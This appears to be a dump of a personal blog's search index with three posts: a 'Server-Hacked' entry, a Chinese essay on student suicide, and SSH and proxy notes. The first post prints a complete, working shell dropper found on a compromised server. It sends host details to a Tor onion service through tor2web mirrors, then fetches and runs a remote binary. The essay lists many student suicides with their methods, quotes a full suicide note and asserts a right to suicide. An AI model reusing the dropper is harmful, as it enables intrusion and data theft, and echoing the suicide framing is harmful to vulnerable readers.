blA4YnlQVUdPd0tqVmZQWlpzcDVvY3RkWEhUV0d5UHFnVmVZODJ6VjFkZTZBWTB5ZEF0Z0VHbW8rSmF1bUVmVgpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICJ3dnp5djJucHRqdXhjcW9pYmVrbHhlc2U0Nmo0dW9uemFhcHd5bDZ3dmhka25qbHFsY29ldTdpZCIpCgpzb2NreigpIHsKbj0oZG9oLmRlZmF1bHRyb3V0ZXMuZGUgZG5zLmhvc3R1eC5uZXQgdW5jZW5zb3JlZC5sdXgxLmRucy5uaXhuZXQueHl6IGRucy5ydWJ5ZmlzaC5jbiBkbnMudHduaWMudHcgZG9oLmNlbnRyYWxldS5waS1kbnMuY29tIGRvaC5kbnMuc2IgZG9oLWZpLmJsYWhkbnMuY29tIGZpLmRvaC5kbnMuc25vcHl0YS5vcmcgZG5zLmZsYXR1c2xpZmlyLmlzIGRvaC5saSBkbnMuZGlnaXRhbGUtZ2VzZWxsc2NoYWZ0LmNoKQpwPSQoZWNobyAiZG5zLXF1ZXJ5P25hbWU9cmVsYXkudG9yMnNvY2tzLmluIikKcz0kKCRjIGh0dHBzOi8vJHtuWyQoKFJBTkRPTSUxMCkpXX0vJHAgfCBncmVwIC1vRSAiXGIoWzAtOV17MSwzfVwuKXszfVswLTldezEsM31cYiIgfHRyICcgJyAnXG4nfGdyZXAgLUV2IFsuXTB8c29ydCAtdVJ8aGVhZCAtbiAxKQp9CgpmZXhlKCkgewpmb3IgaSBpbiAuICRIT01FIC91c3IvYmluICRkIC92YXIvdG1wIDtkbyBlY2hvIGV4aXQgPiAkaS9pICYmIGNobW9kICt4ICRpL2kgJiYgY2QgJGkgJiYgLi9pICYmIHJtIC1mIGkgJiYgYnJlYWs7ZG9uZQp9Cgp1KCkgewpzb2NregpmPS9pbnQuJCh1bmFtZSAtbSkKeD0uLyQoZGF0ZXxtZDVzdW18Y3V0IC1mMSAtZC0pCnI9JChjdXJsIC00ZnNTTGsgY2hlY2tpcC5hbWF6b25hd3MuY29tfHxjdXJsIC00ZnNTTGsgaXAuc2IpXyQod2hvYW1pKV8kKHVuYW1lIC1tKV8kKHVuYW1lIC1uKV8kKGlwIGF8Z3JlcCAnaW5ldCAnfGF3ayB7J3ByaW50ICQyJ318bWQ1c3VtfGF3ayB7J3ByaW50ICQxJ30pXyQoY3JvbnRhYiAtbHxiYXNlNjQgLXcwKQokYyAteCBzb2NrczVoOi8vJHM6OTA1MCAkdC5vbmlvbiRmIC1vJHggLWUkciB8fCAkYyAkMSRmIC1vJHggLWUkcgpjaG1vZCAreCAkeDskeDtybSAtZiAkeAp9Cgpmb3IgaCBpbiB0b3Iyd2ViLmluIHRvcjJ3ZWIuaXQgb25pb24uZm91bmRhdGlvbiBvbmlvbi5jb20uZGUgb25pb24uc2ggdG9yMndlYi5zdSAKZG8KaWYgISBscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzOyB0aGVuCmZleGU7dSAkdC4kaApscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzIHx8IChjZCAvdG1wO3UgJHQuJGgpCmxzIC9wcm9jLyQoaGVhZCAtbiAxIC90bXAvLlgxMS11bml4LzAxKS9zdGF0dXMgfHwgKGNkIC9kZXYvc2htO3UgJHQuJGgpCmVsc2UKYnJlYWsKZmkKZG9uZQo=|base64 -d|bash  #!/bin/bash exec \u0026amp;\u0026gt;/dev/null echo nP8byPUGOwKjVfPZZsp5octdXHTWGyPqgVeY82zV1de6AY0ydAtgEGmo+JaumEfV echo blA4YnlQVUdPd0tqVmZQWlpzcDVvY3RkWEhUV0d5UHFnVmVZODJ6VjFkZTZBWTB5ZEF0Z0VHbW8rSmF1bUVmVgpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICJ3dnp5djJucHRqdXhjcW9pYmVrbHhlc2U0Nmo0dW9uemFhcHd5bDZ3dmhka25qbHFsY29ldTdpZCIpCgpzb2NreigpIHsKbj0oZG9oLmRlZmF1bHRyb3V0ZXMuZGUgZG5zLmhvc3R1eC5uZXQgdW5jZW5zb3JlZC5sdXgxLmRucy5uaXhuZXQueHl6IGRucy5ydWJ5ZmlzaC5jbiBkbnMudHduaWMudHcgZG9oLmNlbnRyYWxldS5waS1kbnMuY29tIGRvaC5kbnMuc2IgZG9oLWZpLmJsYWhkbnMuY29tIGZpLmRvaC5kbnMuc25vcHl0YS5vcmcgZG5zLmZsYXR1c2xpZmlyLmlzIGRvaC5saSBkbnMuZGlnaXRhbGUtZ2VzZWxsc2NoYWZ0LmNoKQpwPSQoZWNobyAiZG5zLXF1ZXJ5P25hbWU9cmVsYXkudG9yMnNvY2tzLmluIikKcz0kKCRjIGh0dHBzOi8vJHtuWyQoKFJBTkRPTSUxMCkpXX0vJHAgfCBncmVwIC1vRSAiXGIoWzAtOV17MSwzfVwuKXszfVswLTldezEsM31cYiIgfHRyICcgJyAnXG4nfGdyZXAgLUV2IFsuXTB8c29ydCAtdVJ8aGVhZCAtbiAxKQp9CgpmZXhlKCkgewpmb3IgaSBpbiAuICRIT01FIC91c3IvYmluICRkIC92YXIvdG1wIDtkbyBlY2hvIGV4aXQgPiAkaS9pICYmIGNobW9kICt4ICRpL2kgJiYgY2QgJGkgJiYgLi9pICYmIHJtIC1mIGkgJiYgYnJlYWs7ZG9uZQp9Cgp1KCkgewpzb2NregpmPS9pbnQuJCh1bmFtZSAtbSkKeD0uLyQoZGF0ZXxtZDVzdW18Y3V0IC1mMSAtZC0pCnI9JChjdXJsIC00ZnNTTGsgY2hlY2tpcC5hbWF6b25hd3MuY29tfHxjdXJsIC00ZnNTTGsgaXAuc2IpXyQod2hvYW1pKV8kKHVuYW1lIC1tKV8kKHVuYW1lIC1uKV8kKGlwIGF8Z3JlcCAnaW5ldCAnfGF3ayB7J3ByaW50ICQyJ318bWQ1c3VtfGF3ayB7J3ByaW50ICQxJ30pXyQoY3JvbnRhYiAtbHxiYXNlNjQgLXcwKQokYyAteCBzb2NrczVoOi8vJHM6OTA1MCAkdC5vbmlvbiRmIC1vJHggLWUkciB8fCAkYyAkMSRmIC1vJHggLWUkcgpjaG1vZCAreCAkeDskeDtybSAtZiAkeAp9Cgpmb3IgaCBpbiB0b3Iyd2ViLmluIHRvcjJ3ZWIuaXQgb25pb24uZm91bmRhdGlvbiBvbmlvbi5jb20uZGUgb25pb24uc2ggdG9yMndlYi5zdSAKZG8KaWYgISBscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzOyB0aGVuCmZleGU7dSAkdC4kaApscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzIHx8IChjZCAvdG1wO3UgJHQuJGgpCmxzIC9wcm9jLyQoaGVhZCAtbiAxIC90bXAvLlgxMS11bml4LzAxKS9zdGF0dXMgfHwgKGNkIC9kZXYvc2htO3UgJHQuJGgpCmVsc2UKYnJlYWsKZmkKZG9uZQo=|base64 -d|bash nP8byPUGOwKjVfPZZsp5octdXHTWGyPqgVeY82zV1de6AY0ydAtgEGmo+JaumEfV exec \u0026amp;\u0026gt;/dev/null export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6) c=$(echo \u0026quot;curl -4fsSLkA- -m200\u0026quot;) t=$(echo \u0026quot;wvzyv2nptjuxcqoibeklxese46j4uonzaapwyl6wvhdknjlqlcoeu7id\u0026quot;) sockz() { n=(doh.defaultroutes.de dns.hostux.net uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh.centraleu.pi-dns.com doh.dns.sb doh-fi.blahdns.com fi.doh.dns.snopyta.org dns.flatuslifir.is doh.li dns.digitale-gesellschaft.ch) p=$(echo \u0026quot;dns-query?name=relay.tor2socks.in\u0026quot;) s=$($c https://${n[$((RANDOM%10))]}/$p | grep -oE \u0026quot;\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b\u0026quot; |tr ' ' '\\n'|grep -Ev [.]0|sort -uR|head -n 1) } fexe() { for i in . $HOME /usr/bin $d /var/tmp ;do echo exit \u0026gt; $i/i \u0026amp;\u0026amp; chmod +x $i/i \u0026amp;\u0026amp; cd $i \u0026amp;\u0026amp; ./i \u0026amp;\u0026amp; rm -f i \u0026amp;\u0026amp; break;done } u() { sockz f=/int.$(uname -m) x=./$(date|md5sum|cut -f1 -d-) r=$(curl -4fsSLk checkip.amazonaws.com||curl -4fsSLk ip.sb)_$(whoami)_$(uname -m)_$(uname -n)_$(ip a|grep 'inet '|awk {'print $2'}|md5sum|awk {'print $1'})_$(crontab -l|base64 -w0) $c -x socks5h://$s:9050 $t.onion$f -o$x -e$r || $c $1$f -o$x -e$r chmod +x $x;$x;rm -f $x } for h in tor2web.in tor2web.it onion.foundation onion.com.de onion.sh tor2web.su do if ! ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status; then fexe;u $t.$h ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status || (cd /tmp;u $t.$h) ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status || (cd /dev/shm;u $t.$h) else break fi done  有时间分析一下此样本\n","date":"2021-02-21T14:29:33Z","permalink":"https://chinggg.github.io/post/server-hacked/","tags":null,"title":"Server-Hacked"},{"categories":["随笔"],"contents":"《自杀论》读书报告——自杀与晚期资本主义社会 说到自杀，人们往往把它当成一种心理现象看待，尝试分析自杀者的精神状态和个人经历，从中寻找其自杀的独特原因。然而，涂尔干在他的著作《自杀论》中指出，自杀其实更是一种社会现象，背后有着深层次的社会原因。在最近年轻人自杀频频发生的背景下，我不能不赞同涂尔干从社会学视角解释自杀现象的合理性，读完《自杀论》后，我尝试运用书中理论理解当今社会自杀频发的原因。\n《自杀论》是一部严谨翔实的社会学著作，在此不对其论证过程做展开，仅简要介绍本书的主要结论为后文的讨论做铺垫。\n涂尔干在对欧洲各国自杀数据进行分析的基础上，把自杀分成三种：利己型自杀、利他型自杀和失范型自杀。\n利己型自杀是新教传播以来个人主义的兴盛而导致的，基于宗教和家庭的传统集体生活渐渐瓦解，个人在得到了相对的自由后却也失去了可依附的对象，脱离了集体活动和社会关系后，生活成了无意义的虚无，既然已看不到生命的价值，自杀便不足为奇了。\n利他型自杀恰恰相反，是由于个人过度融入集体生活，社会对人施以严格控制。为了获得集体的肯定和荣誉，担心被集体所排斥，个人不自觉地在社会给予的压力下朝着集体的目标前进，甚至不惜放弃自己的生命，而他人的自杀又是新一轮狂热的开始。\n失范型自杀是19世纪欧洲典型而普遍的自杀类型，资本主义飞速发展，人们的欲望不断增长，传统的法律道德、价值观念等社会规范遭到挑战，人们毫无准备地被抛置于新的社会秩序中，这种不稳定的社会环境极易滋生暴力，无论是杀人或是自杀。\n当我套用涂尔干关于自杀的理论于当代社会时，竟也能发现一些相通之处。\n现代社会的个人主义倾向已是老生常谈，交通工具的更新和通信技术的发展固然让地球村这一概念深入人心，现实生活中的我们却经常性地处于孤独之中，社会原子化让我们各怀心事又各自为战，功利主义编织的大网没有将我们连接在一起，而是将我们分隔在一个个互相凝视的茧房中。我们自由恋爱成家、自由寻找工作，也能自由地抛弃或被抛弃。“一切皆流，无物常驻”其实本是常态，可资本主义为了让人安分工作又总会提供一种虚假的归属感，“把企业当成家”是再常见不过的口号，然而铁打的营盘流水的兵，当经济状况恶化时，雇佣关系的本质就暴露无疑，下岗失业的残酷现实让幻梦破灭，痛苦更甚。回首向来萧瑟处，也无上帝也无亲，失去了宗教和家庭锁链的我们，真的得到了整个世界吗？或许我们还没做好迎接生命中不可承受之轻的准备？正如马克思所说，人是一切社会关系的总和，一旦脱离社会，个体的生命是那么渺小和短暂，既然自己终究要毁灭，那自杀不过是让这一结局提前到来而已。\n与此同时，个人主义被大力宣扬的背后，却是资本主义文化工业透过大众传媒在操纵着人们的思想，流行文化将批量生产的景观投射给所有社会成员，人们看似能自由选择自己的生活方式，却无时无刻都在被意识形态所塑造。抛去一切由消费构建的外衣，只有赤裸裸的金钱才被承认具有合法性，并成为整个社会所共同追逐的对象和评判个体价值的标尺。马克斯韦伯笔下的新教伦理已然成为事实上的普世价值，凡是与资本主义精神不相容的特征都被认为是一种疾病。陶潜和梭罗式的隐居只能成为幻想，只要参与社会生活，就必须接受社会的度量，哪怕只是想追求个人的小确幸，也不得不被捆绑在资本逐利的大船上，没有任何和解的余地。在这种意义上，每个被冠以奋斗之名在996的流水线上透支生命的打工人都是利他主义自杀在当代社会的牺牲品。\n当今中国处于社会转型期，国内矛盾凸显，国际时局动荡，新冠疫情的突然降临更是让人恍如隔世。信息爆炸、流量为王的时代，世间一切光怪陆离的现象都能立即呈现在我们眼前，挑战着我们的观念。以前我们高喊“知识就是力量”，深信“寒门出贵子”，但后来我们发现，苦尽甘来的不是做题家，而是丁真，小丑竟是我们自己，我们不得不接受“颜值即正义”，自嘲“累就对了，幸福是留给有钱人的”。在价值失范的社会，自杀是无声的控诉。\n如今，自杀率上升已经是一个摆在我们面前的问题，解决方法在哪？涂尔干认为必须从维持社会的有机团结入手，他提出了“职业群体”的制度，试图让职业群体取代家庭和宗教，发挥社会整合与调控的作用。我认为他的出发点是合理的，但他可能没有预见到百年后的世界，社会分工的细致程度大大加强了，社会的团结程度却没有提高，资本主义的确创造出了许多岗位，但职业群体却似乎无法承担整合社会成员的作用，而只是资本运作的副产品，它本身就是不稳定的，只要人无法创造经济价值，就会被无情地驱逐出这个群体，在这里仍然只有赤裸裸的利益关系。在我看来，任何将人不是作为目的，而是作为手段去连接的方式都无法维持社会的团结，因为人与人的关系已被异化，商品拜物教掩盖了真正的社会关系，它对现代社会控制之全面之隐蔽更甚于有史以来的一切宗教，不摆脱它的枷锁，任何从心理学的角度降低自杀率的尝试都是扬汤止沸。\n就在我完成读书报告后不久，拼多多员工猝死事件发生，这虽然不是严格意义上的“自杀”，但无疑正是我所设想的晚期资本主义利他型自杀的典型案例，拼多多官方最初的回应也充分暴露了资本无情的嘴脸：“你们看看底层的人民，哪一个不是用命换钱，我一直不以为是资本的问题，而是这个社会的问题，这是一个用命拼的时代，你可以选择安逸的日子，但你就要选择安逸带来的后果，人是可以控制自己的努力的，我们都可以。”看似客观合理甚至显得积极正能量的回答，却是十足的伪命题。因为即使只是顺应社会现有的规则，也已经是在以加强其合法性的方式参与其中。这个荒诞的世界，是你我共谋的世界。\n自杀永远不会消失，人应当拥有结束自己生命的权利，对部分人来说自杀不过是一种出于理性的选择。但这决不意味着当代社会大批量“生产”自杀的情况是合理的，当人被异化为商品，走投无路之人的自杀也就沦为了过剩商品的自我毁灭，这样的自杀并不是人自由意志的结果，而只是资本逐利的手段，是社会达尔文主义的体现，与其说这是自杀，不如说这是整个社会对个人的蓄意谋杀。与此同时，原本作为个人选择的自杀也被无孔不入的资本主义所寄生，必须将人从异化关系中解放，自杀本身也才能得到解放。\n“做题家”自杀案例分析——以北交大大三跳楼学生为例 背景信息 2020年是大学生自杀事件频发的一年，据网络人士不完全统计如下\n 2020年05月09日 中国传媒大学动画学院研三学生跳楼自杀, 家属认为自杀原因为导师薛燕平阻挠其毕业\n2020年05月23日 南通大学学生跳楼自杀，自杀原因未知\n2020年06月06日 中北大学本科生跳楼自杀, 自杀原因为考试sample作弊被发现\n2020年07月01日 中山大学大四毕业生跳楼自杀，自杀原因未知\n2020年07月30日 于青海可可西里失联的南京航空航天大学大四女生遗骸被发现 (是否属自杀存疑)\n2020年08月18日 南京航空航天大学飞行学院本科生跳楼自杀，自杀原因未知\n2020年08月31日 南京航空航天大学电子信息学院本科生跳楼自杀，自述自杀原因为自身极端理想主义\n2020年09月03日 内蒙古呼和浩特某高校大四女生跳楼自杀，自杀原因未知\n2020年9月初 浙江大学动科院女博士生烧炭自杀，自杀原因为导师压榨\n2020年9月初 上海交通大学自动化系研究生上吊自杀，自杀原因为导师龙承念压榨\n2020年09月10日 浙江理工大学启新学院本科生跳楼自杀，自杀原因疑学业问题\n2020年09月17日 北京交通大学土建学院大二学生跳楼自杀，自杀原因未知\n2020年09月19日 南京大学女博士生跳楼自杀, 自杀原因为导师压榨\n2020年09月19日 中北大学信息商务学院（独立学院）本科新生跳楼自杀, 自杀原因未知\n2020年10月05日 郑州大学本科生跳楼自杀，自杀原因未知\n2020年10月06日 兰州石化职业技术学院大三情侣烧炭自杀, 自杀原因为网贷负债\n2020年10月09日 四川大学华西医学院研二学生跳楼自杀，自杀原因未知\n2020年10月10日 南京审计大学大四学生跳楼自杀，自杀原因未知\n2020年10月上旬 重庆大学学生跳楼自杀，自杀原因未知\n2020年10月12日 江苏大学食品与生物工程学院本科生跳楼自杀, 校方认为自杀原因疑学习困难\n2020年10月12日 华南理工大学医学院学生跳楼自杀，自杀原因未知\n2020年10月13日 大连理工大学化工学院研三学生上吊自杀，自杀原因为毕业压力大，微博名“红烧土豆叶”\n2020年10月14日 广东工业大学华立学院（独立学院）本科生跳楼自杀，自杀原因未知\n2020年10月19日 成都理工大学地质系大一学生于东风渠校内桥梁处失踪，自述找不到生命的意义\n2020年10月22日 北京师范大学博士生跳楼自杀, 自杀原因未知\n2020年10月24日 中南财经政法大学本科生自杀, 自杀原因未知\n2020年10月26日 郑州商学院电气专业大三女生跳楼自杀，自杀原因未知\n2020年10月27日 北京理工大学研三学生跳楼自杀，自杀原因未知\n2020年11月02日 湖南师范大学商学院本科生上吊自杀, 家属认为自杀原因为学工老师肖鹏压榨\n2020年11月05日 合肥工业大学机械学院大二学生跳楼自杀，自杀原因未知\n2020年11月11日 三峡大学本科生跳楼自杀，自杀原因未知\n2020年11月11日 台湾大学陆籍研究生自杀，自杀原因为长期失眠\n2020年11月14日 浙江理工大学政法系学生上吊自杀，自杀原因未知\n2020年11月16日 上海大学数学系大二女生跳楼自杀，自杀原因未知\n2020年11月18日 内蒙古呼和浩特某学院一男学生跳楼自杀，自杀原因未知\n2020年11月18日 上海交通大学密歇根学院学生跳楼自杀，抢救数日后死亡，自杀原因未知\n2020年11月19日 武汉工程大学学生跳楼自杀，自述“自己太笨了、太累了”，B站名“琉科Ryuko”\n2020年11月20日 中山大学公共卫生学院（深圳）毕业年级研究生服药自杀，自杀原因未知\n2020年11月22日 达州职业技术学院大二女生跳楼自杀，自杀原因未知\n2020年11月25日 石家庄铁道大学本科生跳楼自杀，自杀原因未知\n2020年11月25日 四川农业大学学生跳楼自杀，自杀原因未知\n2020年11月28日 中山大学研究生跳楼自杀，自杀原因未知\n2020年11月30日 河南牧业经济学院学生跳楼自杀，自杀原因未知\n2020年12月03日 河南财经政法大学大二女生跳楼自杀，自杀原因未知\n2020年12月03日 湖南第一师范学院外国语学院大四女生上吊自杀，自杀原因未知\n2020年12月04日 南京大学学生烧炭自杀，重度烧伤，现抢救中\n2020年12月05日 西北工业大学本科生跳楼自杀，自杀原因未知\n2020年12月05日 黑龙江科技大学建工学院学生跳楼自杀，自杀原因未知\n2020年12月06日 黑龙江科技大学女生上吊自杀，自杀原因未知\n2020年12月07日 黑龙江科技大学计算机学院学生跳楼自杀，自杀原因未知\n2020年12月08日 广东药科大学卫检专业大二学生于广州大学城新洲村新洲河堤处失踪，12月16日确认离世\n2020年12月13日 安徽师范大学学生跳楼自杀，自杀原因未知\n2020年12月13日 吉林大学莱姆顿学院学生跳楼自杀，自杀原因未知\n2020年12月15日 北京交通大学机电学院大三学生跳楼自杀，自杀原因为“为追求‘全面发展’而舍弃了自身唯一的‘做题’优势，后来\u0026rsquo;意识到问题所在时，为时已晚'”\n2020年12月16日 吉林大学莱姆顿学院学生服药自杀，自杀原因未知\n 从以上数据中，可以看出此类自杀事件具有以下特征：\n 自杀者多为理工科专业学生，男女均有，全国各地各层次高校均有分布 自杀方式多为跳楼，也有上吊、烧炭、失踪 存在同一高校出现连续多人自杀的情况 自杀原因若能明确则多为学业压力和理想破灭，研究生自杀多与导师有关  由于数据统计上的偏差，以上判断仅为个人分析结果，不具备较强的严谨性。但大致可以看出这类自杀现象已不是几个特例，而成为一种典型，可以称之为“做题家”的自杀。由于自杀者的个人信息不便公开，相关资料严重缺乏，下面就其中一位自杀者留下的长篇遗书进行分析，以窥见整个自杀群体的共同心声。\n文字材料—当事人遗书  “再见，各位我所熟识的，或是陌生的人们。 如果你们看到了这段文字，那就说明，我以自己的意志，经过深思熟虑，选择了毁灭自己，这无关任何人，和学校，和辅导员没有任何关系，和我的同学，或是我熟识的人更没有任何关系，希望我的室友或是什么和我关系亲密的人不要借此去闹事。如果你们因此而获得了保研的资格，或是别的什么更大的利益，那对于我们身边那些少说奋斗了三年，多说奋斗了二十年的同学或是同胞不公平。另外，如果你们真的白嫖了三个保研名额的话——为什么不是五个呢？我觉得咱们寝室确实有两个人值得——你们就得给我立个牌位供起来，明白？ 我不会试图塑造一个完美的死者形象，那样的形象只能给人一种“我的自杀是一幕毁灭了某种美好事物的悲剧”的印象，只有把一个千疮百孔，扭曲至极的我展现出来，才能让你们体会到选择毁灭的必要性——然而我并不能将这样的自己完全展示出来，因为在写下这段又臭又长的文字的同时，我那些扭曲的，疯狂的，淫猥的想法已经随着我的毁灭一起，埋葬在我的脑海中。 二十年来我坚信做题是唯一出人头地的途径，我因此放弃了其他的方向，使得做题成为我唯一而且是最为突出的优势，并且相信这是唯一的正途。到了大学之后，我竟然听信了某些自由派的鬼话，妄图“全面发展”，因而舍弃了做题这一优势项目。当我意识到问题所在时，为时已晚。这不啻于我的“戈尔巴乔夫改革”，摧毁了我的根基。接下来呢？生活无望，希望崩塌，对明天的期待已经毁灭殆尽，没有了信念和理想。很多美好的事物都毁在这一点上。因为没有了信念，斯大林格勒的62集团军的红军战士们最后退化成了阿富汗战争里的炮灰；的黎波里海岸上的美国海军陆战队变成了PTSD集中营。至于我，失去信念和理想之后就是今天的结局——“苏联解体”。 然后呢？现在的我不知道未来是什么，不知道我想要什么。灵魂的惯性迫使我沿着原有的轨迹前进，而我的灵魂早就没有了一分再向前推进的力气，支撑着我一步一步走下去的只有我对于别人的承诺，这一天的到来是我的决定，不再履行对别人承诺的决定。我被自己失去动力的灵魂拖着前进，今天它的动量在阻力的长久影响下消耗殆尽了，而我也就决定要离开这个世界。毕竟这样活着也没什么意思，一边把自己伪装的上进阳光而且乐观，一边又在别人看不到的角落里释放自己最阴暗的一面。我不再是之前那样的纯粹的一层，和吴法宪，张铁生之流已经没有区别。 我曾经痛恨过很多东西，资本家，白匪军，官僚，保守主义的老棺材瓤子以及它们的走狗们。但是我已经等不到亲手消灭它们的那一天了，同志们，请代替我完成这个任务，拜托了。 好了，和所有人要说的话说完了，接下来我要给一些对我而言很重要的人单独留下一些话。我希望你们能确保下面的话只有他们自己能看见，毕竟在没有特定语境的情况下，我对一个人说的话多半会被误解成另一个意思，这是我动身前最后一个愿望——学校的话，不必去查找那些信件了，那里面没有你们想知道的东西，只有一些我不想让别人知道的东西，其中并不包括我为什么要这么做，因为这个问题的答案在上面已经很明确了。 最后——尽管叶赛宁的诗据说被网易云用户给玩烂了，不过我觉得用叶赛宁辞世之前在列宁格勒的旅馆里用自己的血写下的绝笔作为我对世界的告别还是挺合适的： 再见吧，我的朋友，再见 亲爱的，你永在我的心间。 命中注定要相互离别， 许诺我们在前方相见 再见，朋友，不必悲伤， 也没有必要愁容满面。 人世间死已不是新鲜事。 而活着，也不见得，更为新鲜。”\n 案例解读 当事人的遗书较长，且运用了较多修辞，为便于理解我按顺序将其拆解为以下几个部分：\n 预先替他人开脱责任；呼吁熟人不要借此闹事而从中牟利；为自己的自杀行为定性——经过了慎重考虑但不是完美纯洁的受害者而是扭曲后必然的毁灭 阐述自己的心路历程：进大学前一心“做题”—听信“自由派”妄图全面发展—发现丧失“做题”能力后失去信念希望崩塌 倾诉自己失去动力后强颜生活的麻木和内心的自闭阴暗 表达自己对部分社会成员的痛恨，希望后来人最终消灭之 对一些重要的人单独留话，让学校不必白费工夫从信件里查找自杀原因 最后以叶赛宁的绝笔诗向世界告别  尽管资料有限，但仅从当事人的遗书中，已经可以发现许多。他应该是一个温柔善良的人，处处替他人考虑，也为学校着想，对历史典故甚至是一些较为禁忌的人物生平都知之甚多，还能恰到好处地引用外国诗人的诗，人文素养不差。全文饱含浓烈情感而又娓娓道来，并无激烈言语发泄愤怒，惟有平静叙述宣告心死，相信读者无论是否有相同的经历，都会为之动容。\n但就是这样一个对世界充满善意的大学生，为何早早地而且是“经过深思熟虑”后选择了自我毁灭？\n正如他自己所说，“问题的答案在上面已经很明确了”，第3部分他的心路历程说明了一切。简言之就是，“做题家”尝试改变自我走进新天地，到头来却发现丢失了自己的基本盘，最终丧失信念。\n“做题家”“内卷”这些词汇已经十分流行，之前同样地处北京的某高校曾有传闻称学生熬夜学习猝死，尽管事后当事人澄清只是一时昏迷并无生命危险，但足以说明大学生内卷过度以至于损害身体健康是多么普遍。不过北交大这位学生的案例在典型的同时又有其特别之处，便是他曾经“听信自由派的鬼话”，有过一段尝试“全面发展”的时期，这是将他与其他“做题家”区分开来的地方，但尝试的结局却又证明了他终究不可能和“做题家”分道扬镳，因为他终于认识到了作为没有资源没有背景的普通大学生，追随“自由派”去“全面发展”并不能带来收益，反而削弱了他唯一可以依靠的硬实力，或许是绩点、科研、竞赛，我们无从得知。但压垮他的并不是这些筹码本身，他本可以重新加入“做题家”的行列努力扳回一城，然而他没有，他倦了，他的信念已然崩塌。他放下笔去做一个“自由派”时越轻盈越愉快，他就越没有勇气越不愿捡起笔再去做题，纵然那是一场梦，也不愿醒来。\n但在某种程度上，他又是幸运的。他可能以为如果没有“自由派”的蛊惑，如果他的“做题”根基依然牢固，他就能继续在正途上前进，也许就能凭着过硬的绩点保研到理想的学校，赢得光明的前景。但众多研究生自杀的案例摆在眼前，其中不乏来自名牌高校者，他们其实就是北交大学生的另一种结局，是的，仍然是自杀的结局，只不过多了几年煎熬岁月，多了一层痛苦领悟，最终他们会发现，原来“做题”也只是一条看不到终点的道路，原来没有摩西的手杖就不能让湍流变坦途。\n我们都在玩着一个没有赢家的游戏，无论是中途体力透支倒下，还是技不如人自刎而亡，或是取得了阶段性的胜利，最终却都走向了自杀的道路，这究竟是为什么？我想出问题的是游戏本身，我们已经忍受了野蛮的规则，为之展开了激烈的竞争，到头来又被告知另有一套评分体系，那之前的努力意义何在？一旦产生这种疑问，自杀就在招手了。\n结语 通过对大学生自杀案例的分析，我希望淡化对自杀者本身性格缺陷的放大和谴责，而关注自杀群体的共性特征，追问大学生自杀现象频繁出现的病灶，但愿这个世界多一点关怀和公正。真的猛士，自会奋然前行，如何能让苟活者在淡红的血色中，依稀看见微茫的希望，更是我们要思考的问题。\n","date":"2020-12-30T00:30:02Z","permalink":"https://chinggg.github.io/post/suicide/","tags":["随笔"],"title":"自杀研究：读书报告与案例分析"},{"categories":["记录"],"contents":"Network For hardware stuff, see Wireless\nSSH Key-Auth ssh-keygen -t rsa\nhost {shortName} Hostname {address} Port 22 User {username} IdentityFile {path/to/key}  do not forget to set private key 600\nWin10-OpenSSH-Server   Install from Settings UI : Optional Features\n  Install from PowerShell : Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0\n  ===Start-Service   Start-Service sshd # OPTIONAL but recommended: Set-Service -Name sshd -StartupType 'Automatic' # then back to local machine: ssh username@servername  Win32-OpenSSH PS: Set-ExecutionPolicy RemoteSigned or powershell -ExecutionPolicy Bypass -File .\\install-sshd.ps1\nSSH-Tunnel http://wlwang41.github.io/content/ops/ssh%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86.html\nhttps://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/\nSSHFS sshfs -C -o reconnect,ServerAliveInterval=15,ServerAliveCountMax=3 \u0026lt;server\u0026gt;:/path /path\nProxy export http_proxy=\u0026quot;http://localhost:1082/\u0026quot; export https_proxy=\u0026quot;http://localhost:1082/\u0026quot; export ftp_proxy=\u0026quot;http://localhost:1082/\u0026quot; export socks_proxy=\u0026quot;http://localhost:1080\u0026quot; export no_proxy=\u0026quot;127.0.0.1,localhost\u0026quot; export ALL_proxy=\u0026quot;socks5://127.0.0.1:1080\u0026quot;  apt: /etc/apt/apt.conf.d/12proxy\nAcquire { HTTP::proxy \u0026quot;http://127.0.0.1:1082\u0026quot;; HTTPS::proxy \u0026quot;socks5h://127.0.0.1:1080\u0026quot;; }  Git: git config --global http.proxy 127.0.0.1:1082\nhttps://note.qidong.name/2020/05/docker-proxy/\nServer ./ew -s ssocksd -l 1080\nClient tsocks: /etc/tsocks.conf\nproxychains: /etc/proxychains.conf\niptables iptables 设计非常灵活，不仅可以当防火墙，还可以进行端口转发，ip 分组过滤等等复杂的功能，甚至可以把它当成微型的编程语言，所以要先俯瞰 iptables 整体的操作逻辑\nTable, Chain 和 Rule 最简单的说法就是 Table 由很多个 Chain 